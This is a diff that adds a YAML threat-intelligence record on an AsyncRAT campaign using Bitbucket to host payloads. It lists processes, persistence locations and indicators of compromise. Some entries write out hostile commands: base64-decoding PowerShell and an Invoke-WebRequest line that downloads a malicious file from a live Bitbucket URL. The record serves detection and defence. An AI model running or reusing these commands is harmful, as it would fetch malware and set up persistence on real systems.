@@ -1,0 +1,53 @@
+description: Attackers exploit Bitbucket to host malicious payloads, using VBScript
+  and PowerShell for obfuscation and execution.
+attribution:
+- AsyncRAT
+malware_families:
+- AsyncRAT
+TTPs:
+  processes:
+  - powershell.exe
+  - regsvcs.exe
+  commandline:
+  - powershell.exe -command $QpWJ = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("..."));
+  - powershell.exe -command $QpWJ = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("..."));
+  powershell:
+  - $QpWJ = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("..."));
+  - Invoke-WebRequest -Uri "https://bitbucket.org/jaiprrfc/sds/downloads/envio4sep.txt"
+    -OutFile "dllhope.txt";
+  scripting_engine:
+  - 01 DEMANDA LABORAL.vbs
+  registry_keys:
+  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  image_load:
+  - '[system.AppDomain]::CurrentDomain.Load'
+  network_connections:
+  - process: powershell.exe
+    destination: hxxps://bitbucket.org/jaiprrfc/sds/downloads/envio4sep.txt
+    port: 443
+  file_activity:
+  - C:\path\to\dllhope.txt
+  - C:\path\to\ClassLibrary3.dll
+  - C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PdjLvfa.lnk
+  persistence:
+  - Registry Run Key
+  - Startup Folder Shortcut
+  pipes: []
+  process_relations:
+  - powershell.exe -> regsvcs.exe
+IOCs:
+  hashes:
+  - 01 DEMANDA LABORAL.vbs: sha256:...
+  - dllhope.txt: sha256:...
+  - ClassLibrary3.dll: sha256:...
+  IPs: []
+  domains:
+  - bitbucket.org
+  URLs:
+  - hxxps://bitbucket.org/jaiprrfc/sds/downloads/envio4sep.txt
+authors:
+- Lovely Antonio
+- Lance Go
+reference: https://www.gdatasoftware.com/blog/2024/10/38043-asyncrat-bitbucket
+date_of_publication: October 10, 2024
+file_creation_date: July 28, 2025
